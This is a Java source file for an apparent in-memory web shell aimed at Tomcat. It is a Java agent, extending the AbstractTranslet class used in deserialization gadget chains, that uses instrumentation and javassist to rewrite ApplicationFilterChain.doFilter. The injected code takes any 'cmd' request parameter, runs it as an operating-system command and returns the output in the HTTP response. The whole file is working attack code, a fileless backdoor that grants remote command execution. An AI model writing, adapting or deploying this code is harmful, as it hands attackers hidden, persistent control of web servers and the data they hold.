import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

public class Main extends AbstractTranslet {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new DefineTransformer(),true);
        // 获取所有已加载的类
        Class[] classes = ins.getAllLoadedClasses();
        for (Class clas:classes){
            if (clas.getName().equals(ClassName)){
                try{
                    // 对类进行重新定义
                    ins.retransformClasses(new Class[]{clas});
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
    public static class DefineTransformer implements ClassFileTransformer {

        public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
            className = className.replace("/",".");
            if (className.equals(ClassName)){
                System.out.println("Find the Inject Class: " + ClassName);
                ClassPool pool = ClassPool.getDefault();
                try {
                    CtClass c = pool.getCtClass(className);
                    CtMethod m = c.getDeclaredMethod("doFilter");
                    m.insertBefore("javax.servlet.http.HttpServletRequest req =  request;\n" +
                            "javax.servlet.http.HttpServletResponse res = response;\n" +
                            "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
                            "if (cmd != null){\n" +
                            "    try {\n" +
                            "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
                            "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                            "        String line;\n" +
                            "        StringBuilder sb = new StringBuilder(\"\");\n" +
                            "        while ((line=reader.readLine()) != null){\n" +
                            "            sb.append(line).append(\"\\n\");\n" +
                            "        }\n" +
                            "        response.getOutputStream().print(sb.toString());\n" +
                            "        response.getOutputStream().flush();\n" +
                            "        response.getOutputStream().close();\n" +
                            "    } catch (Exception e){\n" +
                            "        e.printStackTrace();\n" +
                            "    }\n" +
                            "}");
                    byte[] bytes = c.toBytecode();
                    // 将 c 从 classpool 中删除以释放内存
                    c.detach();
                    return bytes;
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
            return new byte[0];
        }
    }
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
